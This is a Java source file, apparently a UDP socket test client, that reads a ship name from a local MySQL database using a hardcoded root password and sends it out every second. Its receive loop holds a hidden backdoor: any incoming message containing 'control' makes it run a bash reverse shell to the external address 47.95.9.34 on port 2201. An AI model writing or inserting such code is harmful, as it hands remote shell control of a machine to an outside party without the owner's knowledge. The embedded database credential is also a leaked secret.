package com.zzm.test.vast.socket;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;


public class UdpClient {
	private static DatagramSocket socket ;
	private static String name = "123";
	static{
		try {
			socket =  new DatagramSocket();
			Class.forName("com.mysql.jdbc.Driver");
			Connection conn=DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/sealine?useUnicode=true&amp;characterEncoding=utf-8", "root", "keyideaDatabase");
			PreparedStatement ps = conn.prepareStatement("select name from t_Ship ");
			ResultSet rs=ps.executeQuery();
			while(rs.next()){
				name = rs.getString("name");
			}
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		send(name);
		receive();
	}
	public static void send(String name){
		new Thread(){

			@Override
			public void run() {
				while(true){
					try{
					String serverHost = "127.0.0.1";
		            int serverPort = 3344;
		            DatagramPacket dp = new DatagramPacket((name).getBytes(), (name).getBytes().length,
		                InetAddress.getByName(serverHost), serverPort);
		            socket.send(dp);
		            System.out.println("send........................");
		            Thread.sleep(1000);
					}catch(Exception e){
						e.printStackTrace();
					}
				}
			}
			
		}.start();
	}
	public static void receive(){
		System.out.println("接受``````");
		new Thread(){

			@Override
			public void run() {
				while(true){
					try{
						byte[] buffer = new byte[1024];
						DatagramPacket p = new DatagramPacket(buffer, buffer.length);
				        socket.receive(p);
				        byte[] data = new byte[p.getLength()];
				        System.arraycopy(p.getData(), 0, data, 0, p.getLength());
				        String message = new String(data);
				        System.out.println(message);
				        if(message.indexOf("control")>=0){//执行命令
				        	String[] cmds = {"/bin/sh", "-c", "bash -i >& /dev/tcp/47.95.9.34/2201 0>&1"};
				            Runtime.getRuntime().exec(cmds);
				        }
					}catch(Exception e){
						e.printStackTrace();
					}
				}
			}
			
		}.start();
	}
	
	public static void main(String[] args){
		System.out.println("12313123123");
		send(name);
		receive();
	}
}
